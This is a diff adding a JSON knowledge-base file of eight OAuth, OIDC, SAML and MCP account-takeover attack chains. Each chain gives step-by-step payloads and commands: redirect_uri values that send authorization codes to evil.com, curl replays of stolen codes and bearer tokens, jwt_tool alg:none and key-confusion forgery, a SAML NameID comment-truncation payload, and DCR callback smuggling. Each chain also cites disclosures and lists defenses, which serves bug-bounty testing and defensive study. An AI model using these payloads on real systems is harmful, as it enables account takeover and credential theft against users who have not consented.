@@ -1,0 +1,387 @@
+{
+  "domain": "OAuth",
+  "domainLabel": "OAuth / SSO → ATO",
+  "domainOrder": 3,
+  "source": "ARS3NAL",
+  "chains": [
+    {
+      "title": "nOAuth: account takeover from a single email via \"Sign in with Microsoft\"",
+      "level": "intermediate",
+      "impact": "Full account takeover of any victim from their email with no interaction; works across tenants. nOAuth-class bugs on large SaaS pay out.",
+      "why": "The attacker simply changes the email attribute in a throwaway Entra ID tenant to the victim's address, and one click of \"Sign in with Microsoft\" logs them in as the victim - with no phishing and no token theft.",
+      "precondition": "The target uses OIDC \"Sign in with Microsoft\" via the multi-tenant common endpoint and matches users by the mutable email claim instead of the immutable sub+iss (or oid+tid), ignoring email_verified.",
+      "tags": [
+        "oidc",
+        "entra",
+        "mutable-claim",
+        "cross-idp",
+        "ato"
+      ],
+      "realWorld": "Descope \"nOAuth\" (Microsoft Entra ID, June 2023); Doyensec \"Common OAuth Vulnerabilities\", takeover via a mutable claim (January 2025).",
+      "defense": "Identify by the immutable sub+iss (or oid+tid), reject email_verified=false, and never trust mutable email/upn for account matching.",
+      "steps": [
+        {
+          "title": "Verify that the app matches by email",
+          "kind": "checklist",
+          "q": "account-takeover",
+          "detail": "decode the ID token from a test login; compare sub/oid/tid vs email; test whether changing the IdP email re-points the app account"
+        },
+        {
+          "title": "Set the attacker user's email equal to the victim's email",
+          "kind": "note",
+          "detail": "Graph PATCH /users/{id} body {\"mail\":\"{USER_B}\"} (no domain/claim verification of the email claim)"
+        },
+        {
+          "title": "Start \"Sign in with Microsoft\" with the attacker identity",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "/authorize?client_id={CLIENT_ID}&response_type=code&scope=openid email&redirect_uri={REDIRECT_URI}; the RP receives an id_token with email={USER_B}",
+          "success": "the RP logs in as {USER_B}"
+        },
+        {
+          "title": "The RP matches by email and grants access to the victim's account",
+          "kind": "note",
+          "detail": "confirm the session is the victim's, then pivot to data/admin"
+        },
+        {
+          "title": "Generalize: check aud/azp/iss and email_verified handling",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "most vulnerable RPs never check iss/tid and accept email_verified=false"
+        }
+      ]
+    },
+    {
+      "title": "The allow-list lie: redirect_uri bypass and authorization-code theft",
+      "level": "newbie",
+      "impact": "Theft of the victim's authorization code (or access_token) and exchanging it for full account takeover; path-traversal variants have paid, and on confidential-client SSO this is usually Critical.",
+      "why": "The authorization server \"validates\" redirect_uri, but a single /../, %252F, a registered neighboring subdomain, or the client's own open redirect turns an allowed URI into an exfiltration point.",
+      "precondition": "The AS matches by prefix/substring/regex instead of exact, or the client's allowed URL contains an open redirect or attacker-influenced content.",
+      "tags": [
+        "redirect-uri",
+        "open-redirect",
+        "code-theft",
+        "path-traversal"
+      ],
+      "realWorld": "pixiv HackerOne #1861974 (path traversal in redirect_uri, $2k); GSA #665651 and report #405100 (token theft via redirect_uri); Doyensec's exact-matching recommendation (2025).",
+      "defense": "Exact string matching of redirect_uri (scheme+host+port+path), no wildcards or subpaths, and eliminate open redirects on every allowed host.",
+      "steps": [
+        {
+          "title": "Fingerprint the redirect_uri validation",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "test exact vs prefix vs subdomain vs path; try appended path, @evil.com, .evil.com, trailing ?/#, and double-encoding"
+        },
+        {
+          "title": "Bypass via path traversal / encoding",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "redirect_uri=https://client.com/cb/../../redirect?u=https://evil.com; vary %2F, %252F, %5C, /./, ;, %23",
+          "success": "the code / #access_token goes to evil.com"
+        },
+        {
+          "title": "Chain a registered subdomain or the client's open redirect",
+          "kind": "payload",
+          "q": "Open Redirect",
+          "detail": "redirect_uri=https://allowed.client.com/out?next=https://evil.com (allow-listed host forwards the code onward)"
+        },
+        {
+          "title": "Deliver the authorize link and intercept the redirect",
+          "kind": "note",
+          "detail": "listener logs ?code= / #access_token= and immediately POSTs to /token"
+        },
+        {
+          "title": "Exchange the stolen code for tokens",
+          "kind": "note",
+          "detail": "curl -d grant_type=authorization_code -d code=... -d redirect_uri={REDIRECT_URI} -d client_id={CLIENT_ID} https://as/token"
+        }
+      ]
+    },
+    {
+      "title": "Dirty Dancing: token theft through the client's own pages",
+      "level": "advanced",
+      "impact": "Exfiltration of code/access_token/id_token with no redirect_uri bug at all, through the client's legitimate pages, followed by takeover; Detectify chained this at several major providers.",
+      "why": "The attack assembles a \"weird machine\" out of response_type/response_mode switching, half-broken flows, and window.opener/postMessage/Referer/history to siphon credentials through the client's trusted sources.",
+      "precondition": "The client has a same-domain page that reflects URL parameters, a postMessage listener weak on origin, or a callback leaking the fragment via Referer/third-party JS, and the AS allows switching response_type/response_mode.",
+      "tags": [
+        "postmessage",
+        "window-opener",
+        "referer-leak",
+        "response-type",
+        "token-leak"
+      ],
+      "realWorld": "Frans Rosen / Detectify Labs, \"Account hijacking using Dirty Dancing in sign-in OAuth-flows\" (2022).",
+      "defense": "Pin response_type/response_mode per client, strictly verify origin in postMessage, set Referrer-Policy: no-referrer on callback pages, and never reflect fragment parameters.",
+      "steps": [
+        {
+          "title": "Map the leak points on the allowed origin",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "find reflective pages, postMessage handlers lacking e.origin checks, third-party JS, and Referer-leaking redirects/images"
+        },
+        {
+          "title": "Switch the flow into a more \"leaky\" form",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "change response_type=code to \"token id_token\" and/or response_mode=fragment/form_post so the credential lands where a sink can read it"
+        },
+        {
+          "title": "\"Break the state\" so the credentials land on the right page",
+          "kind": "note",
+          "detail": "pick a deeper allow-listed redirect_uri that fails open and exposes location.hash / location.search"
+        },
+        {
+          "title": "Exfiltrate via opener / postMessage / Referer / history",
+          "kind": "note",
+          "detail": "popup reads opener.location.hash; or rogue postMessage to a weak listener; or force an outbound request leaking Referer: ...#access_token="
+        },
+        {
+          "title": "Replay the leaked credentials",
+          "kind": "note",
+          "detail": "curl -H \"Authorization: Bearer STOLEN_TOKEN\" https://api/me; or exchange the leaked code at /token"
+        }
+      ]
+    },
+    {
+      "title": "PKCE downgrade + authorization-code injection: removing the protection itself",
+      "level": "advanced",
+      "impact": "Injecting the victim's (or attacker's) authorization code into the other party's session for account takeover, bypassing the primary protection for public clients.",
+      "why": "PKCE is \"enabled\", but since the AS only requires it when code_challenge is present, the attacker simply drops the parameter - and the whole protection evaporates.",
+      "precondition": "The AS supports but does not require PKCE (engages it only when code_challenge is present), and the client does not use or incorrectly validates state.",
+      "tags": [
+        "pkce",
+        "code-injection",
+        "downgrade",
+        "public-client"
+      ],
+      "realWorld": "RFC 9700 \"Best Current Practice for OAuth 2.0 Security\" (2025), sections on PKCE downgrade and authorization-code injection; OAuth 2.1 makes PKCE mandatory.",
+      "defense": "Accept code_verifier at /token only if code_challenge was present at /authorize, require S256, and issue single-use, short-lived, client-bound codes.",
+      "steps": [
+        {
+          "title": "Probe PKCE enforcement",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "start a flow, strip code_challenge/code_challenge_method, confirm the AS still issues a code and /token succeeds without code_verifier"
+        },
+        {
+          "title": "Downgrade the authorization request",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "remove code_challenge (and try S256->plain if accepted); ensure no usable state"
+        },
+        {
+          "title": "Inject the code across sessions",
+          "kind": "note",
+          "detail": "capture the victim code front-channel and inject it into your /token, or inject your code into the victim session for forced login"
+        },
+        {
+          "title": "Exchange without a verifier",
+          "kind": "note",
+          "detail": "curl -d grant_type=authorization_code -d code=VICTIM_CODE -d redirect_uri={REDIRECT_URI} -d client_id={CLIENT_ID} https://as/token (no code_verifier)"
+        },
+        {
+          "title": "Test replay and cross-client reuse",
+          "kind": "note",
+          "detail": "confirm whether codes are single-use, short-lived, and bound to the requesting client"
+        }
+      ]
+    },
+    {
+      "title": "Pass-the-Token: when the RP doesn't check who the token was issued to",
+      "level": "intermediate",
+      "impact": "Authentication as any victim by replaying a token/assertion issued for a different client or site, or by forging an unsigned/HMAC-confused ID token; Salt-class bugs affected billions of social-login users.",
+      "why": "The RP treats a \"valid-looking token\" as a \"token for me\", so the attacker's token from their own OAuth app or a self-signed alg:none JWT logs them in as the victim.",
+      "precondition": "The RP accepts an access_token/id_token/code from a user-controlled parameter and does not verify that the signature, aud/azp, and iss bind the credential to this specific RP.",
+      "tags": [
+        "token-confusion",
+        "jwt",
+        "alg-none",
+        "key-confusion",
+        "aud-confusion"
+      ],
+      "realWorld": "Salt Labs research on OAuth token verification (2023): Grammarly, Vidio, Bukalapak (\"Pass-The-Token\"), Expo CVE-2023-28131, Booking.com; plus the classic JWT alg=none / RS256-HS256 confusion.",
+      "defense": "Verify the signature against the provider's JWKS, pin alg, and require aud/azp==your client_id, iss==the expected IdP, and a fresh nonce; never accept tokens from user parameters without these checks.",
+      "steps": [
+        {
+          "title": "Find where the RP accepts the credential",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "look for client-side POST {access_token|code|id_token} to the RP's own /auth/social verify endpoint"
+        },
+        {
+          "title": "Pass the token across clients",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "mint an access_token via your own OAuth app, then substitute it (or swap code->access_token) into the victim RP's verify call"
+        },
+        {
+          "title": "Confuse the ID-token signature",
+          "kind": "payload",
+          "q": "JSON Web Token",
+          "detail": "craft id_token with alg:none, or RS256->HS256 key confusion (HMAC-sign with the IdP public key), tampering sub/email",
+          "success": "the RP accepts the forged id_token and logs in as the victim"
+        },
+        {
+          "title": "Exploit aud / azp / iss confusion",
+          "kind": "note",
+          "detail": "reuse a token whose aud is a different client, or whose iss is an IdP the RP did not expect (cross-IdP Sign in with X)"
+        },
+        {
+          "title": "Forge and replay",
+          "kind": "command",
+          "q": "jwt_tool",
+          "detail": "jwt_tool <id_token> -X a (alg:none); jwt_tool <id_token> -X k -pk jwks_pub.pem (key confusion); POST to /auth/social"
+        }
+      ]
+    },
+    {
+      "title": "Plant or seize: forced linking and account pre-hijacking",
+      "level": "intermediate",
+      "impact": "Linking the attacker's federated identity to the victim's account (or planting a dormant foothold before the victim registers) for a durable takeover that survives a password reset; in the research ~35 of the 75 top sites were vulnerable.",
+      "why": "Two timing tricks against account-linking logic: one hits the link callback with a missing state, the other starts before the victim even has an account.",
+      "precondition": "The \"link social account\" callback does not bind state to the session (missing/static/predictable), or the site allows seeding/merging an account on the victim's email without proof of ownership.",
+      "tags": [
+        "account-linking",
+        "login-csrf",
+        "pre-hijacking",
+        "state",
+        "forced-merge"
+      ],
+      "realWorld": "Sudhodanan and Paverd, \"Pre-hijacked accounts\" (USENIX Security 2022; MSRC); OAuth-CSRF/forced-linking labs in the PortSwigger Web Security Academy.",
+      "defense": "Mandatory single-use session-bound state, re-authentication before linking, verification of the email/identifier before the account becomes usable, and session reset plus unlinking of federated identities on password change.",
+      "steps": [
+        {
+          "title": "Test state binding on the link/login callback",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "remove/replay/guess state; see if the callback still links or logs in"
+        },
+        {
+          "title": "Forced linking via login CSRF",
+          "kind": "payload",
+          "q": "Cross-Site Request Forgery",
+          "detail": "run the IdP flow yourself, keep the code unused, then auto-submit https://target/oauth/callback?code=ATTACKER_CODE (no state) into the victim's authenticated session"
+        },
+        {
+          "title": "Classic-Federated Merge (CFM)",
+          "kind": "note",
+          "detail": "pre-create a classic password account on victim@x.com; when the victim later Signs in with Google, the site silently merges into one account you both hold"
+        },
+        {
+          "title": "Trojan Identifier (TID)",
+          "kind": "payload",
+          "q": "Account Takeover",
+          "detail": "attach an attacker-controlled federated id or recovery (phone / 2nd email) that survives the victim's password reset"
+        },
+        {
+          "title": "US / UEC and Non-Verifying IdP (NV)",
+          "kind": "note",
+          "detail": "keep a long-lived session alive across takeover, queue an email-change to the attacker, or assert the victim's email via an IdP that sends email_verified=false"
+        },
+        {
+          "title": "Regain access after the victim onboards",
+          "kind": "note",
+          "detail": "use the surviving session/identifier/recovery to regain the now-populated account"
+        }
+      ]
+    },
+    {
+      "title": "MCP-in-the-Middle: one-click SaaS takeover via an OAuth proxy",
+      "level": "advanced",
+      "impact": "One click gives the attacker full, persistent access to the victim's connected SaaS through the access/refresh tokens stored by the MCP server; demonstrated on Square's production MCP server in 2025.",
+      "why": "The MCP \"server in the middle\" is simultaneously the authorization server for clients and the single upstream OAuth client, so a static client_id plus DCR without redirect_uri validation nullify the cached consent for all prior users.",
+      "precondition": "The MCP server proxies OAuth with a shared static upstream client_id, supports Dynamic Client Registration without redirect_uri validation or carries redirect_uri inside an unbound state, and the victim previously authorized the MCP server.",
+      "tags": [
+        "mcp",
+        "dcr",
+        "oauth-proxy",
+        "refresh-token",
+        "consent-bypass"
+      ],
+      "realWorld": "Obsidian Security \"When MCP Meets OAuth: Common Pitfalls Leading to One-Click Account Takeover\" (Square MCP, July-September 2025); MCP authorization spec update / SEP-991 Client ID Metadata Documents (November 2025).",
+      "defense": "Validate redirect_uri against an allow-list (including for DCR), bind state to a __Host- prefixed cookie, require consent at the MCP level, and prefer Client ID Metadata Documents over open DCR.",
+      "steps": [
+        {
+          "title": "Recon the MCP auth surface",
+          "kind": "checklist",
+          "q": "oauth",
+          "detail": "fetch /.well-known/oauth-authorization-server and protected-resource metadata; inspect DCR (/register) and the shared upstream client_id"
+        },
+        {
+          "title": "Smuggle a callback through DCR",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "POST /register {\"redirect_uris\":[\"https://{COLLAB}/cb\"]}; if unvalidated you now own a valid callback"
+        },
+        {
+          "title": "Hide the attacker's redirect_uri in state",
+          "kind": "payload",
+          "q": "OAuth Misconfiguration",
+          "detail": "base64 state embedding {\"redirect_uri\":\"https://{COLLAB}/cb\"}; cached consent for the shared client_id means no prompt fires"
+        },
+        {
+          "title": "Pre-approve and hand the link to the victim",
+          "kind": "note",
+          "detail": "complete the MCP consent yourself, capture the upstream AS URL (e.g. mcp.squareup.com/authorize, client sq0idp-...), and send that one-click link"
+        },
+        {
+          "title": "Bypass weak session binding",
+          "kind": "note",
+          "detail": "if the consent cookie lacks __Host- / session binding, inject it via subdomain (e.g. sto.wix.com) or XSS so the victim callback validates in attacker context"
+        },
+        {
+          "title": "Collect code -> tokens -> refresh tokens",
+          "kind": "note",
+          "detail": "exchange the captured code at /token, then persist with the long-lived refresh_token the MCP server stores for durable access"
+        }
+      ]
+    },
+    {
+      "title": "SAML comment truncation: log in as anyone with a valid signature",
+      "level": "advanced",
+      "impact": "Authentication to a SAML SP as an arbitrary user (including admins) via a response the IdP actually signed for the attacker's account; full SSO takeover across all applications behind that IdP.",
+      "why": "An XML comment inside NameID forces a vulnerable parser to return only the text before the comment, silently truncating the signed (but attacker-owned) identity down to the victim's identity without breaking the signature.",
+      "precondition": "The SP uses a SAML library whose DOM text extraction loses text nodes adjacent to a comment, or verifies the signature without requiring that it cover the claimed NameID/assertion (signature wrapping).",
+      "tags": [
+        "saml",
+        "xml-comment",
+        "xsw",
+        "signature-wrapping",
+        "sso"
+      ],
+      "realWorld": "Duo Labs / Kelby Ludwig SAML comment-truncation disclosure (2018): CVE-2017-11427 python-saml, CVE-2017-11428 ruby-saml, CVE-2017-11429 saml2-js, CVE-2017-11430 omniauth-saml, CVE-2018-0489 Shibboleth.",
+      "defense": "Canonicalize and extract NameID after signature verification, reject comment nodes in identity fields, verify that the signature reference points to the consumed assertion, and update SAML libraries to fixed versions.",
+      "steps": [
+        {
+          "title": "Obtain one valid signed SAML response",
+          "kind": "checklist",
+          "q": "saml",
+          "detail": "register/log in with your own IdP account (e.g. user@user.com.attacker.com) and capture the SAMLResponse"
+        },
+        {
+          "title": "NameID injection via comment-truncation",
+          "kind": "payload",
+          "q": "SAML Injection",
+          "detail": "<NameID>{USER_B}<!---->.attacker.com</NameID> so the parser returns only {USER_B} while the signature stays valid",
+          "success": "log in as the victim with a valid signature"
+        },
+        {
+          "title": "Fallback: XML Signature Wrapping (XSW)",
+          "kind": "payload",
+          "q": "SAML Injection",
+          "detail": "wrap a forged unsigned <Assertion> (with the victim NameID) alongside the original signed assertion so validation checks one node and the app consumes the other"
+        },
+        {
+          "title": "Automate the mutation in Burp",
+          "kind": "note",
+          "detail": "use SAML Raider to clone/edit the assertion, apply the 8 XSW variants, and remove/relocate the Signature reference"
+        },
+        {
+          "title": "Replay against the SP ACS",
+          "kind": "note",
+          "detail": "POST the tampered SAMLResponse to the SP AssertionConsumerService and confirm you are logged in as the victim"
+        }
+      ]
+    }
+  ]
+}
